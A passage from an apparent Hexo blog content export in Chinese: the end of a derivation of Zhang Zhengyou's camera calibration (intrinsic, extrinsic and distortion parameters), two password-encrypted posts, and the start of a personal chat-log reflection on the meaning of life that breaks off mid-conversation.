src="https://www.zhihu.com/equation?tex=+%5Cbegin%7Baligned%7D++v_%7B0%7D=&+%5Cfrac%7BB_%7B12%7D+B_%7B13%7D-B_%7B11%7D+B_%7B23%7D%7D%7B+B_%7B11%7D+B_%7B22%7D-B_%7B12%7D%5E%7B2%7D%7D+%5C%5C+%5Calpha+&=%5Csqrt%7B%5Cfrac%7B1%7D%7BB_%7B11%7D%7D%7D+%5C%5C++%5Cbeta=&+%5Csqrt%7B%5Cfrac%7BB_%7B11%7D%7D%7BB_%7B11%7D+B_%7B22%7D-B_%7B12%7D%5E%7B2%7D%7D%7D+%5C%5C+%5Cgamma=&-B_%7B12%7D+%5Calpha%5E%7B2%7D+%5Cbeta+%5C%5C++u_%7B0%7D=&+%5Cfrac%7B%5Cgamma+v_%7B0%7D%7D%7B%5Cbeta%7D-B_%7B13%7D+%5Calpha%5E%7B2%7D%5Cend%7Baligned%7D%5C%5C" alt="[公式]"> </p><p>即可求得相机的内参矩阵 <img src="https://www.zhihu.com/equation?tex=A=%5Cleft(%5Cbegin%7Barray%7D%7Bcccc%7D%7B%5Cfrac%7Bf%7D%7Bd+X%7D%7D+&+%7B-%5Cfrac%7Bf%5Ccot+%5Ctheta%7D%7Bd+X%7D%7D+&+%7Bu_%7B0%7D%7D+&+%7B0%7D+%5C%5C+%7B0%7D+&+%7B%5Cfrac%7Bf%7D%7Bd+Y+%5Csin+%5Ctheta%7D%7D+&+%7Bv_%7B0%7D%7D+&+%7B0%7D+%5C%5C+%7B0%7D+&+%7B0%7D+&+%7B1%7D+&+%7B0%7D%5Cend%7Barray%7D%5Cright)+=+%5Cleft%5B%5Cbegin%7Barray%7D%7Bccc%7D%7B%5Calpha%7D+&+%7B%5Cgamma%7D+&+%7Bu_%7B0%7D%7D+%5C%5C+%7B0%7D+&+%7B%5Cbeta%7D+&+%7Bv_%7B0%7D%7D+%5C%5C+%7B0%7D+&+%7B0%7D+&+%7B1%7D%5Cend%7Barray%7D%5Cright%5D" alt="[公式]"> 。</p><h5 id="6-2-3-求解外参矩阵"><a href="#6-2-3-求解外参矩阵" class="headerlink" title="6.2.3.求解外参矩阵"></a>6.2.3.求解外参矩阵</h5><p>这里再次强调一下，对于同一个相机，<strong>相机的内参矩阵取决于相机的内部参数，无论标定板和相机的位置关系是怎么样的，相机的内参矩阵不变。</strong>这也正是在第2部分“求解内参矩阵”中，我们可以利用不同的图片（标定板和相机位置关系不同）获取的矩阵 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> ，共同求解相机内参矩阵 <img src="https://www.zhihu.com/equation?tex=A" alt="[公式]"> 的原因。</p><p>但是，外参矩阵反映的是标定板和相机的位置关系。对于不同的图片，标定板和相机的位置关系已经改变，此时<strong>每一张图片对应的外参矩阵都是不同的</strong>。</p><p>在关系： <img src="https://www.zhihu.com/equation?tex=A(R+1+%5Cquad+R+2+%5Cquad+T)=H" alt="[公式]"> 中，我们已经求解得到了矩阵 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> （对于同一张图片相同，对于不同的图片不同）、矩阵 <img src="https://www.zhihu.com/equation?tex=A" alt="[公式]"> （对于不同的图片都相同）。通过公式： <img src="https://www.zhihu.com/equation?tex=(R+1+%5Cquad+R+2+%5Cquad+T)=A%5E%7B-1%7D++H" alt="[公式]"> ，即可求得每一张图片对应的外参矩阵 <img src="https://www.zhihu.com/equation?tex=(R+1+%5Cquad+R+2+%5Cquad+T)" alt="[公式]"> 。</p><p>注意，这里值得指出，完整的外参矩阵为 <img src="https://www.zhihu.com/equation?tex=%5Cleft(%5Cbegin%7Barray%7D%7Bll%7D%7BR%7D+&+%7BT%7D+%5C%5C+%7B0%7D+&+%7B1%7D%5Cend%7Barray%7D%5Cright)" alt="[公式]"> 。但是，由于张正友标定板将世界坐标系的原点选取在棋盘格上，则棋盘格上任一点的物理坐标 <img src="https://www.zhihu.com/equation?tex=W+=+0" alt="[公式]">，将旋转矩阵的 <img src="https://www.zhihu.com/equation?tex=R" alt="[公式]"> 的第三列 <img src="https://www.zhihu.com/equation?tex=R3" alt="[公式]"> 消掉，因此， <img src="https://www.zhihu.com/equation?tex=R3" alt="[公式]"> 在坐标转化中并没有作用。但是 <img src="https://www.zhihu.com/equation?tex=R3" alt="[公式]"> 要使得 <img src="https://www.zhihu.com/equation?tex=R" alt="[公式]"> 满足旋转矩阵的性质，即列与列之间单位正交，因此可以通过向量 <img src="https://www.zhihu.com/equation?tex=R1,R2" alt="[公式]"> 的叉乘，即 <img src="https://www.zhihu.com/equation?tex=R3=R1+%5Ctimes+R2" alt="[公式]"> ，计算得到<img src="https://www.zhihu.com/equation?tex=R3" alt="[公式]">。</p><p>此时，相机的内参矩阵和外参矩阵均已得到。</p><h5 id="6-2-4-标定相机的畸变参数"><a href="#6-2-4-标定相机的畸变参数" class="headerlink" title="6.2.4.标定相机的畸变参数"></a>6.2.4.标定相机的畸变参数</h5><p>张正友标定法仅仅考虑了畸变模型中影响较大的径向畸变。</p><p>径向畸变公式（2阶）如下：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Barray%7D%7Bl%7D%7B%5Chat%7Bx%7D=x%5Cleft(1+k_%7B1%7D+r%5E%7B2%7D+k_%7B2%7D+r%5E%7B4%7D%5Cright)%7D+%5C%5C+%7B%5Chat%7By%7D=y%5Cleft(1+k_%7B1%7D+r%5E%7B2%7D+k_%7B2%7D+r%5E%7B4%7D%5Cright)%7D%5Cend%7Barray%7D+%5C%5C" alt="[公式]"> </p><p>其中，<img src="https://www.zhihu.com/equation?tex=(x,+y),+(%5Chat%7Bx%7D,+%5Chat%7By%7D)" alt="[公式]">分别为理想的无畸变的归一化的图像坐标、畸变后的归一化图像坐标，  <img src="https://www.zhihu.com/equation?tex=r" alt="[公式]"> 为图像像素点到图像中心点的距离，即 <img src="https://www.zhihu.com/equation?tex=r%5E%7B2%7D=x%5E%7B2%7D+y%5E%7B2%7D" alt="[公式]"> 。</p><p>图像坐标和像素坐标的转化关系为：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cleft(%5Cbegin%7Barray%7D%7Bl%7D%7Bu%7D+%5C%5C+%7Bv%7D+%5C%5C+%7B1%7D%5Cend%7Barray%7D%5Cright)+=+%5Cleft(%5Cbegin%7Barray%7D%7Bccc%7D%7B%5Cfrac%7B1%7D%7Bd+X%7D%7D+&+%7B-%5Cfrac%7B%5Ccot+%5Ctheta%7D%7Bd+X%7D%7D+&+%7Bu_%7B0%7D%7D+%5C%5C+%7B0%7D+&+%7B%5Cfrac%7B1%7D%7Bd+Y+%5Csin+%5Ctheta%7D%7D+&+%7Bv_%7B0%7D%7D+%5C%5C++%7B0%7D&+%7B0%7D+&%7B1%7D%5Cend%7Barray%7D%5Cright)%5Cleft(%5Cbegin%7Barray%7D%7Bl%7D%7Bx%7D+%5C%5C+%7By%7D+%5C%5C+%7B1%7D%5Cend%7Barray%7D%5Cright)%5C%5C" alt="[公式]"></p><p>其中，<img src="https://www.zhihu.com/equation?tex=(u,+v)" alt="[公式]">为理想的无畸变的像素坐标。由于 <img src="https://www.zhihu.com/equation?tex=%5Ctheta" alt="[公式]"> 接近于 <img src="https://www.zhihu.com/equation?tex=90%5E%7B%5Ccirc%7D" alt="[公式]"> ，则上式近似为：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Barray%7D%7Bl%7D%7Bu=%5Cfrac%7Bx%7D%7BdX%7D+u_0%7D+%5C%5C+%7Bv=%5Cfrac%7By%7D%7BdY%7D+v_0%7D%5Cend%7Barray%7D%5C%5C" alt="[公式]"></p><p>同理可得畸变后的像素坐标<img src="https://www.zhihu.com/equation?tex=(%5Chat%7Bu%7D,+%5Chat%7Bv%7D)" alt="[公式]">的表达式为：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Barray%7D%7Bl%7D%7B%5Chat%7Bu%7D=%5Cfrac%7B%5Chat%7Bx%7D%7D%7BdX%7D+u_0%7D+%5C%5C+%7B%5Chat%7Bv%7D=%5Cfrac%7B%5Chat%7By%7D%7D%7BdY%7D+v_0%7D%5Cend%7Barray%7D%5C%5C" alt="[公式]"> </p><p>代入径向畸变公式（2阶）则有：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Barray%7D%7Bl%7D%7B%5Chat%7Bu%7D-u_0=%5Cleft(u-u_%7B0%7D%5Cright)%5Cleft(1+k_%7B1%7D+r%5E%7B2%7D+k_%7B2%7D+r%5E%7B4%7D%5Cright)%7D+%5C%5C+%7B%5Chat%7Bv%7D-v_0=%5Cleft(v-v_%7B0%7D%5Cright)%5Cleft(1+k_%7B1%7D+r%5E%7B2%7D+k_%7B2%7D+r%5E%7B4%7D%5Cright)%7D%5Cend%7Barray%7D+%5C%5C" alt="[公式]"> </p><p>可化简得：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Barray%7D%7Bl%7D%7B%5Chat%7Bu%7D=u+%5Cleft(u-u_%7B0%7D%5Cright)%5Cleft(k_%7B1%7D+r%5E%7B2%7D+k_%7B2%7D+r%5E%7B4%7D%5Cright)%7D+%5C%5C+%7B%5Chat%7Bv%7D=v+%5Cleft(v-v_%7B0%7D%5Cright)%5Cleft(k_%7B1%7D+r%5E%7B2%7D+k_%7B2%7D+r%5E%7B4%7D%5Cright)%7D%5Cend%7Barray%7D+%5C%5C" alt="[公式]"></p><p>即为：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cleft%5B%5Cbegin%7Barray%7D%7Bcc%7D%7B%5Cleft(u-u_%7B0%7D%5Cright)+r%5E%7B2%7D%7D+&+%7B%5Cleft(u-u_%7B0%7D%5Cright)+r%5E%7B4%7D%7D+%5C%5C+%7B%5Cleft(v-v_%7B0%7D%5Cright)+r%5E%7B2%7D%7D+&+%7B%5Cleft(v-v_%7B0%7D%5Cright)+r%5E%7B4%7D%7D%5Cend%7Barray%7D%5Cright%5D%5Cleft%5B%5Cbegin%7Barray%7D%7Bl%7D%7Bk_%7B1%7D%7D+%5C%5C+%7Bk_%7B2%7D%7D%5Cend%7Barray%7D%5Cright%5D=%5Cleft%5B%5Cbegin%7Barray%7D%7Bc%7D%7B%5Chat%7Bu%7D-u%7D+%5C%5C+%7B%5Chat%7Bv%7D-v%7D%5Cend%7Barray%7D%5Cright%5D+%5C%5C" alt="[公式]"> </p><p>上式中的 <img src="https://www.zhihu.com/equation?tex=%5Chat%7Bu%7D,+u,+%5Chat%7Bv%7D,+v" alt="[公式]"> 可以通过识别标定板的角点获得，每一个角点可以构造两个上述等式。有m幅图像，每幅图像上有n个标定板角点，则将得到的所有等式组合起来，可以得到个mn未知数为的 <img src="https://www.zhihu.com/equation?tex=k+=+%5B+k_1,+k_2%5D%5ET" alt="[公式]"> 约束方程，将约束方程系数矩阵记为 <img src="https://www.zhihu.com/equation?tex=D" alt="[公式]"> ，等式右端非齐次项记为 <img src="https://www.zhihu.com/equation?tex=d" alt="[公式]"> ，可将其记着矩阵形式：</p><p><img src="https://www.zhihu.com/equation?tex=D+k=d+%5C%5C" alt="[公式]"> </p><p>则使用最小二乘法可求得：</p><p><img src="https://www.zhihu.com/equation?tex=k=%5Cleft%5B%5Cbegin%7Barray%7D%7Bl%7D%7Bk_%7B1%7D%7D+%5C%5C+%7Bk_%7B2%7D%7D%5Cend%7Barray%7D%5Cright%5D=%5Cleft(D%5E%7BT%7D+D%5Cright)%5E%7B-1%7D+D%5E%7BT%7D+d+%5C%5C" alt="[公式]"> </p><p>此时，相机的畸变矫正参数已经标定好。</p><p>需要指出，上述公式推导的时候以2阶径向畸变为例，但实际上更高阶的径向畸变同理，只是需要的约束方程个数更多而已。</p><h3 id="【参考资料】"><a href="#【参考资料】" class="headerlink" title="【参考资料】"></a>【参考资料】</h3><p>1、相机标定之张正友标定法数学原理详解（含python源码），<a href="https://zhuanlan.zhihu.com/p/94244568">https://zhuanlan.zhihu.com/p/94244568</a></p><p>2、<a href="https://zhuanlan.zhihu.com/p/75076326"><em>世界</em>、<em>相机</em>、图像<em>坐标系</em>之间的转换(三维重建)</a>，<a href="https://www.zhihu.com/search?type=content&amp;q=%E7%9B%B8%E6%9C%BA%E5%9D%90%E6%A0%87%E7%B3%BB%E5%88%B0%E4%B8%96%E7%95%8C%E5%9D%90%E6%A0%87%E7%B3%BB">https://www.zhihu.com/search?type=content&amp;q=%E7%9B%B8%E6%9C%BA%E5%9D%90%E6%A0%87%E7%B3%BB%E5%88%B0%E4%B8%96%E7%95%8C%E5%9D%90%E6%A0%87%E7%B3%BB</a></p>]]></content>
      
      
      <categories>
          
          <category> AI算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 三维重建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>理发师</title>
      <link href="2023/03/30/7Rationality3Sensibility/Sensibility/%E7%90%86%E5%8F%91%E5%B8%88/"/>
      <url>2023/03/30/7Rationality3Sensibility/Sensibility/%E7%90%86%E5%8F%91%E5%B8%88/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4d0f9ef459439db115b519de53f2872abdd076a0b2a1bdc50cc4bef1f6b6f0f1">c05db5c9326e1a204d18d71a654b071fa5312b3d80e91bfb1999962a533063f2950ff0ba5a602f0ea588b92548da4742a8ecc48d321ef39158e38634aa39c2ac90f209d06339f6eaa968b793e5ca0bc14d2fe86db30120f0f8c948783598338a2d4da7040547273c25fb88b0f6ccba301f42a16f6b34395829c00dcc497fc121bd6017174a8f49d66de41f6a1085e3d79308cc86b679dc994b74c0438fa230bc6babd63094ec2d8def2bb9e489ad2e2fb6f961319a9ae9ce3c4d8848bf54b8040a7eb60f5222dc918eab54ac231cf58ebfd24970d86e8a789624da9265bb7811336324f9575baa87adfd5bb9e3b1a9a9bc8ee0dd930d587b530054556b8724bad87e706a654e16e7455adcb3ca860bf7e7a779f8af0ce0e0355d9a6e85d9c3e648ee476a0f08b4e992cf54afdfd60498ad315660fb6fb1409fa9dededc3925d4cb8c348ae8e0ad68cc9c21ba47d722482a3c566b4a5f0c0a657e6e895fcd6ce68375dc3e773fd1f7514358cf3da1b55e9bbb53f1d7fb423f1620c2ff583263f62aeb587b6577d3af929fa8785b17633b92cf44cdf5e20fe39c98477063ebbff0f1a0791c948e1af3d8d3b251271352900ab684d46d182e58934ee0ff319a2a50288e5974a7b5c39c11c46553f789cb720528431334fdb2e3b93d5728a3111a4c52df4a5775a718a8058dd50b92ad098afd0184da6655bbac84649a9f45418339bec40a54abcf143a76758bc3406a2c20407b6a13a71cea24721bf7b3f96eb34a1f522a1a229265dd8bae7aa27002bcadb26f08484e43c297e6d454ac84d51e3a4f3a041fa76814df63df013f79193c2bdcfe61ed2d0b7c764f000299f387e8a70edae84a405b5dd650bf0af85e4b78b09001af540f9ca1bad81dfa5c0bd14a86d5faf3b9ddb9a1b4d1c4acda000bc222487f3b63503ac8c0adfd49dc00c6c05e662119abad357ddcacdf281bc7409f73450ccc35633b56799d4f7315791b0675c89915c9ebf3e8965ee09becd6e1cbecaab7c339142bb3a85a3a8c18358d0880db49f156fa10deb7a18637fa77b89bf3917e7971371e593a42d8a56796481a454c630d054946b4e13c33bbe9059f034ea8815efbb0584f78c586267aa2b58ace5e61a140b41b8abf91f5d8325893bc049e952b6b513de6a7bf63d2b00fb773de854d42b110dcf88e286bc954e0fc26a20007efb750fe6b7f4461e8c48d5a07512b2f21345ee4ebbcb638779e55a6b6820a7a81b1720ad5bdd1e2dca3b81ec4fe70d0c3eb14f01490256281da0adf1f7c2ba758cc43827eb6a73fd3ccf2f267acaf04ccb2292bad76537b1e44221a1308e8a5b5285fb8627f63dcf7393eb542899b2eaad1aff400f8002ac924ef6b56b3c86688b02310c1e57a669e3944ab740993f1f794c829fa88b7b3242c03f3637b7ed5e62c0531c500a1f28e00b124abb050c3480e0c30d739cca1d9d93ce9fd62503de738843c2a89d3f8ce31325e86f2234ea7374b47e72c6eebce60e7ed3fde92993decc49bdc0c264cf951baaaee9de8bf84265b6c8d5340e5c6b58086bcba6dd053a77672b4126bef6a8b70dcdc9270afe3e4e1db3f183bb28504dd396545c00e21983b9b6b55978b7fbcb6bf2cdda869cbd7d3b79139374c4afad798c5efa4e2fe8094748f165be4914f96254a69d53ab2913fbfe55f203a4dd86ccefb422ce629c076df6a792c8ea5fd73b41f126442833fe30de5e7b2e93e17777ee988a6697837b3c9d38be145f53207c757d8f545407fae9198ab8e59600985aba7e85be9c9ec19892de2544e8942f69b360eb66e14bbafe1a8035cbeac0c3ebec5c61545e336467a44a3c0a258d97f1d31535811b55eba950d32315a8981f2fd7e7adba8fba09e1310e054985a6aa53825beec9df3696e0c7da37665d484a446075d7d35976f53ba8b1edd799caff1f2d941f0b9e35eed6a546b8aafd8fefd348f184df19a55eddff7ffbd876cc423603c0f20e8d5c451b9e10d51398fd24e9d80065e67deac9bbbc614a1df2ab08a2cb1bb323d908120791a99fc3cf8d1d6fe161f59a19e8e50e6af2cecd666affa7fe56139ff769f139100f5d05de222cca8b02968ae892276f4222ce5b224822d4c4246bc8383598aa660f9f4add191a525a63b1adb04a7ecb80a8eb4bfa0b12a199b946846d431adcb6aa565080ace7e6ef74477938abd21a194492fd6401d4bfbb7f13f72397d2416ab3a2e12f71f29da0ed8d4256459ef88ef7adfc05d8047937c3658fc0f15c12d16b1ba4eee8c38aa76d72222f90448d51fcd2c28b94d922ec63537453a3c3a5bcdbe5a6dbede30c61428880a70273e55d4163f8d78e8c536e02a9713585ff946ebbe0d76989264e7ab3dcbc96282846d59b7fb3f215aa74d37af7b90844e26b6bbdb992feb7a2a3adcacb407901c002296219ff268eea896aaf3e78359b131b9baf1d5664e0536c388e6b6a2cfe862a80328c4ab76ce7ba4ab9b02a5d61f1594bf1532d96b44bcc9dcf2508e7240270a4495bd116906c250bc40b58b6c33b4dc7ae74621bd1087eb204c94368c9517b971899fb82bb50e6acee8f895542f0209791af66c0218100a482f328f3dbe5f7350f13124df88f84117ef8b5c1089c5444ad4b5041f5b3e16a71c37ecc9909ed4eacc8e5c7ce83433b840a59847971f1316e258cddb656a4486ba16593f4d0a94c149126893787c4ab45dcd61b6f1d80aa0b88a45e8b21f912744d5095a0517c38d006b57aaaa3cf147f4b28d7547f51f90f75868fdd0a51abc4f24f0c476fd8e2f0f4e74b57c73f85fd51d1c252f3b164a1b359200b4676d303b10054acb97577abdb305dc61b0cd01f67bd6cf033f45c7f3f14b7cf66bacef063b8c5649ad5d1b29ced6591f4b856a015a8002058dacd8b4e8aa903c3715a4ba06eff1f4507765de8dad9094abe084958727047aad770134303a29562c16aff815ac043d86e674b59ec0b89b286f28d04d57dffcb512ce3550a7eea45eb2d8b94db78ddd9ae59bf09a5ffd8d376300904350c81438d6ed4559156d6060fdb9ac99ac63239d7a0650b3fcbe433e530e368264a56a1a1bb17da021cf21ec775aa61ec3c4440b19c15ef3c635b5e3e562fc872a325a016c35712d53ec3a524a2f6fd7f9df0440c53170a0d22c824918714ea642b714bcecb4bf73bc6b2fd627d162ad9975a8920f54ef23b63b56c7f9d4d0faf2197c1e8948f7d0092ecada048cdf11f0b0415397ee218587877bc3aa00a0585a15923ea8d99a15ca33b66f88d92ffa576d6c1a324eca4bba99bef8bb43faa1ced7a6d9569a543ddaee2d366f24b9961181a65ef9dfe1164700c6f82b91cbb9eec859e6f71610e629ae40ef150dd0fb814657dd95b8a882f0caa86b7db15540c25dc163631c5f631486259711a54225944e558331fbe5ed46a59662ffeb09154e54fdad87a02acf96f00c5a1ae27566f99c41e0e4ea92114acd8fca166691c7f9a996acb8b86894f640d85cf8e8fca94637fac8c5fc13e9a854142095a56b90beb5a95fb62799fbdf8d379e902f84ae04f181f48f66cdac5e5ae8e29b229042a28c7c164d002b3b5d35a78097122be568f7f93584d18abfe7eca907d1f817b8c095b8a63abe31127097bd0cb0206e5e2fab419e6fcc3ed9bd20d76540ab9951fc6795cd872f7418ec550d6c89ed579f1f1d7b0eee1252eba498ae5040f820e71807f853aab28ae963c8f335eaadf1f18e91ead48cd1f60622ded27329da004399b8af053c12ad48e684f8ff6b31fab9baad68bc688fd5f174733c94efb5e5eeb52505a191f05bbaf6800d1b98d503b54617485764795f86a0bf7b8ecbe14f8acebd7d10ad5ace7d6f74ba945d771b0e465b86ae0745101fd0ee39741f3189dd1db3bea71398c4b34224defae5a180ca60612e01252ea6fc6e92e507f29302366cb113f947dfaf509961d37c6823306917eb1769e20e2c37fd217aabd41ea999065d8445f7b59fbae665cc9782d4d9152e980e4138f83a467da3175761eeb1d82e72aae46845b148bdf29b2ff2fad26660062471c2334efd073b3d7402b09880cdec770126fd892184487a9eefc76a1720d14b2f49bc7d891cf21b1bde5f35e301f6f468417f6643fa71af185fcd7ae80552b0b8092a9b3568a2319c65e8e8ca500511f645f3a2bacc92dd5985dfd68e966675284a7475e8ca986e0035fc5ba0ac1ded943fb563a17aa8eaa2f197fb949feecb76989eb6cc0dc1e9f5d6381f09c7bac2857aa1786aa2bf61e5b200a0edff1c8320966ebb71de0e09ec9c54f05a773496b147441f7bfc36a31bbfd47f6f564411b5f03b1feaec066b7cda7c4f4aafe46b34c2ef31f1da04bd8eea4c26399fbfc796a2da6f67356bee1e46e8bde7bd56591580120cb29f1220deed2dace315b041b80087753ef4812809e554cad6c437b59b412e05659f45269a2d2a210aedf11992c20d0c795e2ab0a3c685974b73eb2e4638f8a3985ccd15e62be3f4b5ca0fd86bdd123f46ecd223192e38a93356fde8b60d39013f6c03ce4b465b6a3004ae09dde7ae85888f8f20a717381c1557b4c506e60dc8552f2c2ec3f01bd22a433a5045669c3a4fd99404e0a29c8e7d6f9313d5e8d7e1eeee0e682a810049d4c5e0e1962520f9bd2b51118b54ac3fe0cbc68aca96f9baa6c1d381906cc0e454f8579fd99bb2ea870e065117e54f1dd8e99639ab814249820106bb7d43c227da113f820599c2a9276fd99660a4f3e63ab6458aa4f93805cb42b1b7404b2a930eb874fa66fbee21c1d1bfd8dbacfc84a382553d78d19baee78e9200e7119b970486c4ae6bf54ebc67eade20c28ea075113c5977eda7bce7c55866836022fde08db1f829bc5dd8521c5824ee10164273cb172395e93e00845cd775c5a6885cd186bba43ac6faba723da02518f01a534becf56bed34f0af5e4dafea5b7afdfece44b78f0b4f22134f04b428a28743df7b9b0e0215042672207ee7550e9f980bb7f03b946872b55e7772f7c45a297929b389183b207abce3138496260dadbf4d85810d5360933ff2f57d52cc220a472c8a182bf0d93d682544fce6afd214e3a54d9fb215244b30dde1b5bd811a8b250a611f81f675797e94486eae19d236c2dd9fc34e9552e3218820e267c06af915abe0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 7R3S </category>
          
          <category> Sensibility </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优秀类属性</title>
      <link href="2023/03/30/7Rationality3Sensibility/Sensibility/%E4%BC%98%E7%A7%80%E7%B1%BB%E5%B1%9E%E6%80%A7/"/>
      <url>2023/03/30/7Rationality3Sensibility/Sensibility/%E4%BC%98%E7%A7%80%E7%B1%BB%E5%B1%9E%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="7d0dd9edd91aacb0041681028654a6154a67e78483f617168b072f733348369a">05c331a532b5415eaa1b364943779679918c2e6f5e0766cc3db6d761ddce4c50b2ed3696805b79d8a458f4cfebefd717888f8f03b6a83662b2cb708fc2b1c405b1a7e39736543f83652e0391d27edf01776710d72e6d3eafc8c08a6228aa34bc52c7ebf1dc14bda32fd37911b2f437ad9f728740928e5ff59ed2df348d5970a868bb5070fb533b3fb39664f3d2f212c54bb437a9936020df7711cffa6325894c2eb83572c734cdf87ceb548616326851786d6e7bf4a8659be2f76b3589d0168e0df884fc04a4e23085d9d47cb3c925783772c5c6ad2918bca131a89fda3883be170bfbd0b0cac20f51f73e0956a3eb6970f75de596ae5999d548c3943d8079bd7469e1e55ee79fbd89ac61582d0761ab3a2c712094415aae8bb0381121ae0e52bfecb054e2d5202689dc11056b08321890b614b08d2a31b4e368efbd5f0c46e430403d71a2c140812504af276ab751522e638bcc69eec53fad379f1d354bbdc584f00ca45fea83c4be53b9b2afc68a6e96a7befb7d1f23cfb8a48343693ab07cc94390857815fecb8fd3dc267f6edd1312f9aca6227ebb207714375db5866328437d4b1eb23cfcf6ab94169db65fd6a6e67b0db417840047eed844e04dab894f21b02e6bb8586d0f9c97e662fbeb1e96a1b6033ff2156094919505d1f2f450bb89fc7333e9371d86447bf2ea4fe2ae203e862e55584c2b48e7d49be3d4d3e99e811d524df83e88c2ec50377ea721baca7aa6d33ab36905a6173d235e987f411fdbf7319cfac388e0f74df29348de0056afdd7525a43651121a7c25e6f7a656c5991a787c048fd84c786b12caf9a12d190cffd842d71c3976beb8968c4d7d56091ed4041ca605aa63efc7eb91b2b2cc71180cd77a7e0add6d0e460d104a298f4cb02b0ad35745c2b1f02935f95eb59894ca69b13e0b38d2fcd88cb56a7af97c0226cb2882c5dfb871136807f7bc732e9cd5da17d498ed91fe058bcb40d96b4ea03f314d6143112f541b37072d201da69421e39413175eb69e1915854990c74c4d0974cffa2ecbb765346fc5d6b309be72d228252a893056c05a480ac54c190d4302d005d1961032367c8a99150a47c9f47a42ecae6818d3ad4d8a8d0d6f0c8b624ac47483f3b95f48a4e1563716216b05</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 7R3S </category>
          
          <category> Sensibility </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于生命终极意义的思考与讨论</title>
      <link href="2023/03/30/7Rationality3Sensibility/Rationality/%E5%85%B3%E4%BA%8E%E7%94%9F%E5%91%BD%E7%BB%88%E6%9E%81%E6%84%8F%E4%B9%89%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E8%AE%A8%E8%AE%BA/"/>
      <url>2023/03/30/7Rationality3Sensibility/Rationality/%E5%85%B3%E4%BA%8E%E7%94%9F%E5%91%BD%E7%BB%88%E6%9E%81%E6%84%8F%E4%B9%89%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E8%AE%A8%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="灵魂发问"><a href="#灵魂发问" class="headerlink" title="灵魂发问"></a>灵魂发问</h2><p>生命的意义是什么？我活着是为了啥？最终是为了什么？我做的事情对未来的我有何本质意义？（此处讨论的意义是指对于生命本身个体而言，不讨论对别的个体或群体而言）</p><p>这也许属于哲学范畴的问题，也许属于神学，亦或是科学？何为科学？</p><h2 id="与rq的讨论"><a href="#与rq的讨论" class="headerlink" title="与rq的讨论"></a>与rq的讨论</h2><blockquote><p>2021-05-31===xy&amp;rq<br>18:29:55 xy:你说，人生的意义是什么？生命的意义？<br>18:40:59 rq:这个啊<br>18:41:29 rq:我觉得是幸福快乐就好了<br>18:41:41 rq:不同的人肯定有不同的答案<br>18:43:13 xy:确实<br>18:43:32 xy:我昨晚梦到的答案，就是赋予生命以意义<br>18:44:01 rq:我觉得你适合看看萨特[表情]<br>18:44:08 xy:然后就想通了。其实生命是没有意义的，所谓的意义都是个人赋予的<br>18:44:22 rq:嗯，这个有点虚无主义的味道<br>18:44:29 xy:就像，三个境界<br>18:44:33 rq:其实意义本身这个东西<br>18:44:36 xy:看山是山<br>18:44:38 rq:定义很模糊<br>18:44:40 xy:看山不是山<br>18:44:45 xy:看山还是山<br>18:44:52 rq:哈哈哈<br>18:44:54 xy:你看过爱死机吗<br>18:44:54 rq:是<br>18:45:01 rq:没<br>18:45:05 xy:前段时间很火的<br>18:45:08 xy:动漫<br>18:45:08 rq:是动画片吗<br>18:45:17 rq:哦哦，美漫吗<br>18:45:17 xy:爱，死亡与机器人<br>18:45:21 xy:是的<br>18:45:24 rq:我之前在人人上看到过<br>18:45:42 xy:第二季里面有个叫齐马蓝那集的<br>18:46:18 rq:嗯嗯<br>18:46:18 xy:幸福快乐，本质上是自己赋予了多巴胺以意义<br>18:46:27 rq:那是的<br>18:46:36 rq:理智上确实这样<br>18:46:44 rq:但是你快乐的时候<br>18:46:51 rq:不会想思考太多<br>18:47:17 rq:意义啊<br>18:47:25 xy:最终目的<br>18:47:40 rq:我觉得可能是人类以生存之后，产生的副产品<br>18:47:52 xy:我指的不是对于别人的意义，是那种对于个体来说，最终的归宿<br>18:48:09 rq:人在感受一个东西，觉得他有意义的时候，一定是有利于DNA传播的事情<br>18:48:24 rq:其实仔细分析下来<br>18:48:25 xy:也就是可以理解为生物本能？<br>18:48:27 rq:确实是这样的<br>18:48:34 